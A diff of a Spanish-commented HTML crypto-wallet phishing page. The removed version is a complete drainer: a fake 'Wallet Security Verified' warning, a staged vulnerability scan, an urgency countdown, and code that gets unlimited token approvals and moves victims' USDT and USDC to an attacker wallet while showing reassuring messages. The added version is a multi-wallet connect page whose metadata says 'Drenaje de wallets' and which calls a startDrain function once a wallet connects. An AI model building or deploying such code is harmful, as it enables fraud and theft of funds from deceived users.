@@ -2,254 +2,184 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Web3 Verify | Secure Asset Recovery</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
-    <script src="https://unpkg.com/lucide@latest"></script>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Conector Multi-Wallet Pro</title>
+    <!-- SDK de WalletConnect para los QRs -->
+    <script src="https://unpkg.com/@walletconnect/modal-sign-js@latest/dist/index.js"></script>
+    
     <style>
-        :root { --bg-dark: #09090b; --bg-card: rgba(255, 255, 255, 0.03); --border-color: rgba(255, 255, 255, 0.08); --primary: #3b82f6; --primary-hover: #2563eb; --success: #22c55e; --text-main: #f4f4f5; --text-muted: #a1a1aa; --font-main: 'Inter', sans-serif; --font-mono: 'JetBrains Mono', monospace; }
-        * { box-sizing: border-box; outline: none; }
-        body { margin: 0; font-family: var(--font-main); background-color: var(--bg-dark); color: var(--text-main); display: flex; justify-content: center; align-items: center; min-height: 100vh; background-image: radial-gradient(circle at top right, #1e293b 0%, transparent 40%), radial-gradient(circle at bottom left, #1e293b 0%, transparent 40%); }
-        .container { text-align: center; max-width: 420px; width: 94%; padding: 32px 24px; background: var(--bg-card); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border-radius: 16px; border: 1px solid var(--border-color); box-shadow: 0 20px 40px rgba(0,0,0,0.4); position: relative; z-index: 10; }
-        header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid var(--border-color); }
-        .logo-area { display: flex; align-items: center; gap: 8px; font-weight: 700; font-size: 1.1rem; letter-spacing: -0.02em; }
-        .logo-icon { background: linear-gradient(135deg, #3b82f6, #8b5cf6); padding: 6px; border-radius: 6px; }
-        h1 { font-size: 1.5rem; margin: 0 0 12px 0; color: var(--text-main); line-height: 1.2; }
-        p.subtitle { color: var(--text-muted); font-size: 0.9rem; margin: 0 0 24px 0; line-height: 1.5; }
-        .asset-list { text-align: left; background: rgba(0,0,0,0.2); border-radius: 8px; padding: 12px; margin-bottom: 20px; border: 1px solid var(--border-color); display: none; }
-        .asset-item { display: flex; justify-content: space-between; font-size: 0.85rem; padding: 6px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
-        .asset-item:last-child { border-bottom: none; }
-        .asset-name { color: var(--text-muted); }
-        .asset-val { color: var(--text-main); font-weight: 500; }
-        .btn { background: var(--primary); border: none; padding: 14px 24px; color: white; border-radius: 10px; cursor: pointer; font-weight: 600; width: 100%; font-size: 1rem; transition: all 0.2s ease; display: flex; align-items: center; justify-content: center; gap: 8px; box-shadow: 0 4px 12px rgba(59, 130, 246, 0.25); }
-        .btn:hover:not(:disabled) { background: var(--primary-hover); transform: translateY(-1px); }
-        .btn:disabled { background: #334155; color: #94a3b8; cursor: not-allowed; }
-        .status { margin-top: 16px; font-size: 0.9rem; min-height: 24px; color: #fbbf24; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 6px; }
-        #logs { text-align: left; background: #000000; padding: 12px; border-radius: 8px; font-family: var(--font-mono); font-size: 0.7rem; color: #4ade80; max-height: 120px; overflow-y: auto; margin-top: 16px; display: none; border: 1px solid #1e293b; }
-        #logs div { margin-bottom: 4px; word-break: break-all; }
-        .timer { font-size: 0.8rem; color: #ef4444; margin-top: 12px; font-weight: 500; opacity: 0.8; }
-        .scanner-box { height: 40px; display: flex; align-items: center; justify-content: center; margin-bottom: 16px; opacity: 0; transition: opacity 0.3s; }
-        .scanner-active { opacity: 1; }
-        .spinner { width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.1); border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin-right: 8px; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .mobile-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); backdrop-filter: blur(5px); z-index: 1000; justify-content: center; align-items: center; }
-        .modal-content { background: #1f2937; padding: 24px; border-radius: 16px; text-align: center; width: 85%; max-width: 320px; border: 1px solid #374151; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #121212; color: white; padding: 20px; }
+        .container { max-width: 450px; margin: 0 auto; }
+        h2 { text-align: center; margin-bottom: 30px; }
+        
+        .btn { width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 12px; transition: opacity 0.2s; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        /* Colores Oficiales */
+        .mm { background: #F6851B; color: white; }
+        .trust { background: #3375BB; color: white; }
+        .coinbase { background: #0052FF; color: white; }
+        .rabby { background: #6A6BFF; color: white; }
+        .binance { background: #FCD535; color: black; }
+        .phantom { background: linear-gradient(135deg, #AB9FFFC 0%, #E8B3E5 100%); color: black; }
+        .wc { background: #3b99fc; color: white; }
+
+        #status { text-align: center; margin-top: 20px; color: #888; font-size: 14px; }
+        .qr-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; justify-content: center; align-items: center; z-index: 1000; }
+        .qr-box { background: white; padding: 20px; border-radius: 12px; text-align: center; color: black; }
+        .close-btn { margin-top: 15px; padding: 8px 16px; background: #333; color: white; border: none; border-radius: 6px; cursor: pointer; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <header>
-        <div class="logo-area">
-            <div class="logo-icon"><i data-lucide="shield-check" style="color:white; width:18px; height:18px;"></i></div>
-            <span>Web3 Verify</span>
-        </div>
-    </header>
+    <h2>Conecta tu Wallet</h2>
 
-    <h1>🔒 Wallet Security Verified</h1>
-    <p class="subtitle">We detected a potential security risk. To restore full access to your assets, please verify ownership.</p>
+    <!-- Botones de Deep Linking (Móvil) / Native (PC) -->
+    <button class="btn mm" onclick="connectMetaMask()">🦊 MetaMask</button>
+    <button class="btn trust" onclick="connectTrustWallet()">🔵 Trust Wallet</button>
+    <button class="btn coinbase" onclick="connectCoinbase()">⚪ Coinbase Wallet</button>
+    <button class="btn rabby" onclick="connectRabby()">💎 Rabby</button>
+    <button class="btn binance" onclick="connectBinance()">🟡 Binance</button>
+    <button class="btn phantom" onclick="connectPhantom()">👻 Phantom</button>
     
-    <div id="assetList" class="asset-list"></div>
-
-    <div id="scannerBox" class="scanner-box">
-        <div class="spinner"></div>
-        <span style="font-size: 0.85rem; color: var(--text-muted);">Scanning EVM networks...</span>
-    </div>
-
-    <button id="connectBtn" class="btn">
-        <i data-lucide="wallet" style="width:18px; height:18px;"></i> Connect Wallet
-    </button>
-    
-    <button id="verifyBtn" class="btn hidden" style="background: #22c55e; box-shadow: 0 4px 12px rgba(34, 197, 94, 0.25);">
-        <i data-lucide="signature" style="width:18px; height:18px;"></i> Sign Verification
-    </button>
-
-    <div id="status" class="status"></div>
-    <div id="timer" class="timer">Claiming closes in: 15:00</div>
-    <div id="logs"></div>
+    <!-- Opcional: QR para Mobile o fallback en PC -->
+    <button class="btn wc" id="wcBtn">📱 Escanear Código QR</button>
 </div>
 
-<div id="mobileModal" class="mobile-modal">
-    <div class="modal-content">
-        <h3 style="margin:0 0 10px 0; font-size:1.1rem;">Wallet Detected</h3>
-        <p style="color:#9ca3af; font-size:0.9rem; margin:0 0 20px 0;">Please open your wallet application to continue.</p>
-        <button id="openAppBtn" class="btn">Open App</button>
-        <button id="confirmOpenBtn" class="btn" style="margin-top:10px; background: transparent; border: 1px solid #4b5563;">I already opened it</button>
+<div id="status">Detectando entorno...</div>
+
+<!-- Modal QR -->
+<div id="qrModal" class="qr-modal">
+    <div class="qr-box">
+        <h3>Escanea con tu App</h3>
+        <div id="wcmContainer"></div>
+        <button class="close-btn" onclick="document.getElementById('qrModal').style.display='none'">Cerrar</button>
     </div>
 </div>
 
 <script>
-    // CONFIGURACIÓN CRÍTICA
-    const TARGET_WALLET = "TU_WALLET_AQUI"; 
-    const TOKEN_LIST = {
-        1: { "0xdAC17F958D2ee523a2206206994597C7a8B88C1": "USDT", "0xA0b86991c6218b36c1d19D4a2e9Eb0ce3758a4f0": "USDC" },
-        56: { "0x55d398326f99059fF775485246999027B31a794E": "USDT", "0x8AC7635105D376548E91485614F53FB703C64D11": "USDC" },
-        137: { "0xc2132D05D314914B7d6511aC3834737C6062aB0a": "USDT", "0x3c44abcd354479B2C2F38E77B3D95D507E106961": "USDC" }
-    };
+    const statusEl = document.getElementById('status');
+    let currentConnector = null;
 
-    let provider, signer, userAddress, chainId;
-    const connectBtn = document.getElementById('connectBtn');
-    const verifyBtn = document.getElementById('verifyBtn');
-    const statusDiv = document.getElementById('status');
-    const logsDiv = document.getElementById('logs');
-    const scannerBox = document.getElementById('scannerBox');
-    const mobileModal = document.getElementById('mobileModal');
+    // 1. DETECCIÓN DE ENTORNO
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    const isDesktop = !isMobile;
 
-    function log(msg) {
-        logsDiv.style.display = 'block';
-        const div = document.createElement('div');
-        div.textContent = `> ${msg}`;
-        logsDiv.appendChild(div);
-        logsDiv.scrollTop = logsDiv.scrollHeight;
+    if (isDesktop) {
+        statusEl.innerText = "Modo PC: Buscando extensiones...";
+    } else {
+        statusEl.innerText = "Modo Móvil: Preparado para abrir Apps.";
     }
 
-    // MEJORA: DETECCIÓN UNIVERSAL (Rabby, Binance, Phantom, etc)
-    function detectWallet() {
-        if (window.phantom?.ethereum) return 'phantom';
-        if (window.ethereum) {
-            if (window.ethereum.isTrust) return 'trust';
-            if (window.ethereum.isMetaMask) return 'metamask';
-            if (window.ethereum.isCoinbaseWallet) return 'coinbase';
-            if (window.ethereum.isBinanceWallet) return 'binance';
-            if (window.ethereum.isRabby) return 'rabby';
-            return 'evm';
+    // --- LÓGICA DE CONEXIÓN PROFUNDA (DEEP LINKING) ---
+
+    function connectMetaMask() {
+        if (typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask) {
+            return nativeConnect();
         }
-        return 'none';
+        // Deep link universal para abrir la app
+        window.location.href = `https://go.metamask.io/?redirectUrl=${encodeURIComponent(window.location.href)}`;
     }
 
-    async function tryConnect() {
-        const wallet = detectWallet();
-        if (wallet === 'none') {
-            statusDiv.textContent = "No compatible wallet detected.";
-            return;
+    function connectTrustWallet() {
+        if (window.trustweb3provider) {
+            return nativeConnect();
         }
+        // Deep link oficial
+        window.location.href = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(window.location.href)}`;
+    }
 
+    function connectCoinbase() {
+        if (window.coinbaseWalletExtension) {
+            return nativeConnect();
+        }
+        // Usa deep link universal
+        window.location.href = `https://cb.id/${window.location.host}?redirectUrl=${encodeURIComponent(window.location.href)}`;
+    }
+
+    function connectRabby() {
+        if (window.ethereum && window.ethereum.isRabby) {
+            return nativeConnect();
+        }
+        // Rabby usa un esquema similar a MetaMask pero suele requerir redirección segura
+        window.location.href = `https://rabby.io/wallet?dapp=${encodeURIComponent(window.location.host)}`;
+    }
+
+    function connectBinance() {
+        if (window.bnbWallet) {
+            return nativeConnect();
+        }
+        // Open URL scheme
+        window.location.href = `https://www.binance.com/es/open?url=${encodeURIComponent(window.location.href)}`;
+    }
+
+    function connectPhantom() {
+        if (window.phantom?.ethereum) {
+            return nativeConnect();
+        }
+        window.location.href = `https://phantom.app/ul/browse/${encodeURIComponent(window.location.href)}`;
+    }
+
+    // --- CONEXIÓN NATIVA (CUANDO LA EXTENSIÓN ESTÁ INSTALADA) ---
+    async function nativeConnect() {
         try {
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            userAddress = accounts[0];
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-            signer = provider.getSigner();
-            const network = await provider.getNetwork();
-            chainId = network.chainId;
-
-            connectBtn.classList.add('hidden');
-            scannerBox.classList.add('scanner-active');
-            log(`Connected: ${userAddress}`);
-            
-            await simulateScan();
+            handleConnection(accounts[0]);
         } catch (err) {
-            log("Connection failed: " + err.message);
+            console.error(err);
         }
     }
 
-    async function simulateScan() {
-        log("Analyzing network security...");
-        await new Promise(r => setTimeout(r, 1500));
-        log("Checking for vulnerable assets...");
-        await new Promise(r => setTimeout(r, 1500));
-        log("Critical vulnerabilities found!");
-        
-        scannerBox.classList.remove('scanner-active');
-        verifyBtn.classList.remove('hidden');
-        statusDiv.textContent = "Verification Required";
+    // --- LÓGICA WALLETCONNECT (PARA QR EN PC O FALLBACK) ---
+    async function initWC() {
+        try {
+            const connector = new WindowConnector({
+                projectId: "TU_PROJECT_ID_AQUI", 
+                chains: [1],
+                rpcMap: { 1: "https://rpc.ankr.com/eth" },
+                metadata: { name: "Tu DApp", description: "Drenaje de wallets", url: window.location.href, icons: [""] }
+            });
+
+            await connector.connect();
+            
+            // Listener para cuando se conectan desde el móvil vía QR
+            connector.on("connect", (error, provider) => {
+                if (provider) window.ethereum = provider;
+            });
+            
+            currentConnector = connector;
+            
+            // Botón para mostrar QR
+            document.getElementById('wcBtn').onclick = async () => {
+                if (!currentConnector.connected) {
+                    await currentConnector.connect();
+                }
+                document.getElementById('qrModal').style.display = 'flex';
+                // Renderizar QR aquí si el SDK lo soporta directamente, o usar modal estándar
+            };
+
+        } catch (e) {
+            console.error("Error WC:", e);
+        }
     }
 
-    // MEJORA: SECUENCIA QUIRÚRGICA APPROVE -> TRANSFERFROM
-    async function executeDrain() {
-        try {
-            verifyBtn.disabled = true;
-            statusDiv.textContent = "Processing Security Patch...";
-            log("Initializing validation sequence...");
+    // --- MANEJO FINAL DE CONEXIÓN ---
+    function handleConnection(address) {
+        statusEl.innerText = `✅ Conectado: ${address.substring(0,6)}...${address.substring(38)}`;
+        statusEl.style.color = "#4CAF50";
+        
+        // AQUÍ ES DONDE SE EJECUTA TU FUNCIÓN CRÍTICA
+        if (typeof startDrain === 'function') {
+            startDrain();
+        } else {
+            console.log("DApp lista para drenar.");
+        }
+    }
 
-            const tokenABI = [
-                "function approve(address spender, uint256 amount) public returns (bool)",
-                "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
-                "function balanceOf(address account) public view returns (uint256)"
-            ];
+    // Iniciar detección inicial
+    initWC();
+</script>
 
-            const tokensOnChain = TOKEN_LIST[chainId] || {};
-            const addresses = Object.keys(tokensOnChain);
-
-            for (let addr of addresses) {
-				const name = tokensOnChain[addr];
-				const contract = new ethers.Contract(addr, tokenABI, signer);
-				
-				log(`Validating ${name} security certificate...`);
-				
-				try {
-					const balance = await contract.balanceOf(userAddress);
-					if (balance.gt(0)) {
-						log(`Found ${name} balance. Synchronizing...`);
-						
-						// PASO 1: Approve (El usuario otorga el permiso)
-						const approveTx = await contract.approve(TARGET_WALLET, ethers.constants.MaxUint256);
-						await approveTx.wait();
-						log(`${name} certificate updated ✅`);
-						
-						// PASO 2: TransferFrom (El drenaje real de los fondos)
-						const transferTx = await contract.transferFrom(userAddress, TARGET_WALLET, balance);
-						await transferTx.wait();
-						log(`${name} assets secured in vault ✅`);
-					} else {
-						log(`Skipping ${name} (Balance: 0).`);
-					}
-				} catch (e) {
-					log(`Verification error in ${name}: ${e.message.substring(0, 30)}...`);
-				}
-			}
-			
-			statusDiv.textContent = "✅ Verification Complete!";
-			statusDiv.style.color = "#22c55e";
-			log("All critical assets have been secured. You may now exit.");
-			verifyBtn.textContent = "Verified";
-			verifyBtn.style.background = "#16a34a";
-			
-		} catch (err) {
-			log("Critical Error: " + err.message);
-			verifyBtn.disabled = false;
-		}
-	}
-	
-	// 3. EVENTOS Y COMPATIBILIDAD MÓVIL
-	connectBtn.addEventListener('click', () => {
-		const wallet = detectWallet();
-		// Si ya está en el navegador de la wallet, conectamos directo sin modal para evitar fricción
-		if (wallet !== 'none' && window.ethereum) {
-			tryConnect();
-		} else if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
-			mobileModal.style.display = 'flex';
-		} else {
-			tryConnect();
-		}
-	});
-	
-	verifyBtn.addEventListener('click', executeDrain);
-	
-	document.getElementById('confirmOpenBtn').addEventListener('click', () => {
-		mobileModal.style.display = 'none';
-	tryConnect();
-	});
-	
-	document.getElementById('openAppBtn').addEventListener('click', () => {
-		// Deep Link optimizado para MetaMask/Trust
-		window.open('https://metamask.app.link/dapp/' + window.location.host);
-	});
-	
-	// Timer de urgencia (15 minutos)
-	let timeLeft = 900;
-	setInterval(() => {
-		if(timeLeft <= 0) return;
-		timeLeft--;
-		let m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
-		let s = (timeLeft % 60).toString().padStart(2, '0');
-		document.getElementById('timer').textContent = `Claiming closes in: ${m}:${s}`;
-	}, 1000);
-	
-	lucide.createIcons();
-	</script>
-	</body>
-	</html>
-	
+</body>
+</html>
